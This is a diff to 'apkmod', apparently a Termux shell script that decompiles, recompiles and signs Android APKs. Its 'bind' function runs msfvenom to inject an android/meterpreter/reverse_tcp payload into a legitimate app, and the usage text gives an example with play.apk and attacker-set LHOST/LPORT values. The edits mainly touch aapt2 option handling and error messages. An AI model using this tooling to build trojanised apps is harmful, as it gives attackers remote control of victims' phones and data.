@@ -19,7 +19,18 @@ purple='\033[1;35m'
 reset='\033[0m'
 
 usage() {
-	printf "${yellow}Usage: apkmod [option] [EXTRAARGS] [/path/to/input.apk] [/path/to/output.apk]\n${purple}valid options are:${blue}\n  -v		print version\n  -d		For decompiling\n  -r		For recompiling\n  -s		For signing\n  -b		For binding payload\n  -o\t\tSpecify output file or directory\n  -a\t\tUse aapt2\n${yellow}Example:\n  ${blue}apkmod -b /sdcard/apps/play.apk -o /sdcard/apps/binded_play.apk LHOST=127.0.0.1 LPORT=4444  ${purple}bind the payload with play.apk and saves output in given directory.\n${green}Apkmod is like a bridge between your termux and alpine by which you can easily decompile recompile signapk and even bind the payload using metasploit\n${reset}"
+	printf "${yellow}Usage: apkmod [option] [/path/to/input.apk] -o [/path/to/output.apk] [EXTRAARGS]
+    ${purple}valid options are:${blue}
+    -v              print version
+    -d              For decompiling
+    -r              For recompiling
+    -s              For signing
+    -b              For binding payload
+    -o              Specify output file or directory
+    -a              Use aapt2
+    ${yellow}Example:
+    ${blue}apkmod -b /sdcard/apps/play.apk -o /sdcard/apps/binded_play.apk LHOST=127.0.0.1 LPORT=4444  ${purple}bind the payload with play.apk and saves output in given directory.
+    ${green}Apkmod is like a bridge between your termux and alpine by which you can easily decompile recompile signapk and even bind the payload using metasploit\n${reset}"
 }
 
 error_msg() {
@@ -48,7 +59,7 @@ decompile() {
 	print_status "Decompiling ${1}"
 	apktool d -f ${1} -o ${2}
     if [ ! -e ${2} ]; then
-        error_msg "Can't bind, take screenshot and open a issue on github"
+        error_msg "Can't decompile, take screenshot and open a issue on github"
         exit 1
     fi
 	print_status "Decompiled into ${2}"
@@ -57,12 +68,12 @@ decompile() {
 recompile() {
 	print_status "Recompiling ${1}"
     if [ "${USE_AAPT2}" = "yes" ]; then
-        apktool b --use-aapt2 /usr/bin/aapt2 -o ${2} ${1}
+        apktool b -a /usr/bin/aapt2 -o ${2} ${1}
     else
         apktool b -a /usr/bin/aapt -o ${2} ${1}
     fi
     if [ ! -e ${2} ]; then
-        error_msg "Can't recompile, take screenshot and open a issue on github"
+        error_msg "Try again with -a option\nBut if still can't recompile, take screenshot and open a issue on github"
         exit 1
     fi
 	print_status "Recompiled to ${2}"
@@ -84,9 +95,12 @@ signapk() {
 
 bindapk() {
 	print_status "Binding ${3}"
-	msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${4}
+    if [ "${USE_AAPT2}" = "yes" ]; then
+        aapt_arg="--use-aapt2"
+    fi
+    msfvenom -x ${3} -p android/meterpreter/reverse_tcp LHOST=${1} LPORT=${2} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true ${aapt_arg} -o ${4}
 	if [ ! -e ${4} ]; then
-		error_msg "Can't bind, take screenshot and open a issue on github"
+		error_msg "Try again with -a option\nBut if still can't bind, take screenshot and open a issue on github"
 		exit 1
 	fi
 	print_status "Binded to ${4}"
@@ -151,7 +165,7 @@ if [ $# -eq 0 ]; then
     exit 1
 fi
 
-while getopts ":d:r:s:b:o:hv" opt; do
+while getopts ":d:r:s:b:o:ahv" opt; do
     case $opt in
         d)
             ACTION="decompile"
@@ -179,7 +193,7 @@ while getopts ":d:r:s:b:o:hv" opt; do
             out_abs_path=$(readlink -f ${OPTARG})
             ;;
         a)
-            USE_AAPT2="TRUE"
+            USE_AAPT2="yes"
             ;;
         h)
             usage
